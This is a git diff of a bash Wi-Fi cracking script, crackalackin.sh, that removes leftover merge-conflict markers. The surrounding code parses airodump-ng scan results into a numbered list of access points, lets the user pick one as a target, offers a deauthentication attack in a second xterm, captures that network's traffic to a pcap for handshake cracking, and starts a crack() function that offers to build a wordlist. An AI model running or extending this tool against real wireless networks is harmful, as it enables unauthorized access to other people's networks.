@@ -45,35 +45,15 @@ target() {
     interface=$(choose_interface)
 
     OLDIFS=$IFS; IFS=','
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-    COUNT=0
-=======
+
     COUNT=1
->>>>>>> Update crackalackin.sh
-=======
-    #first line is \n
-    COUNT=0
->>>>>>> bugfix and update cracjalackin
-=======
-    COUNT=1
->>>>>>> small fix
     while read line; do
         arr=($line)
         if [[ "${arr[0]}" =~ "Station MAC" ]]; then
             break
         fi
         if [[ ! ${arr[13]} == " " ]]; then
-<<<<<<< HEAD
-<<<<<<< HEAD
-            echo "$((COUNT+1)) ${arr[13]} ${arr[3]} ${arr[5]} ${arr[8]} ${arr[0]}"
-=======
             echo "$COUNT ${arr[13]} ${arr[3]} ${arr[5]} ${arr[8]} ${arr[0]}"
->>>>>>> Update crackalackin.sh
-=======
-            echo "$COUNT ${arr[0]} ${arr[3]} ${arr[8]} ${arr[5]} ${arr[13]}"
->>>>>>> bugfix and update cracjalackin
         fi
         COUNT=$((COUNT+1))
     done < scan-01.csv
@@ -82,10 +62,6 @@ target() {
     targ+="q;d" && t=$(sed "$targ" scan-01.csv) && target=($t)
     IFS=$OLDIFS
 
-<<<<<<< HEAD
-=======
-    # Finish this one day hehe
->>>>>>> Update crackalackin.sh
     read -p "Deauth[y/n] " deauth
     if [ $deauth == "y" ]; then
         echo "Pop another x-term to deauth"
@@ -95,8 +71,6 @@ target() {
     xterm -e bash -c "airodump-ng --channel ${target[3]} --bssid ${target[0]} $interface -w 'crack' --output-format pcap"
     
 }
-
-
 
 crack() {
     read -p "[*] Do you want to make a wordlist [y/n] " wordlist
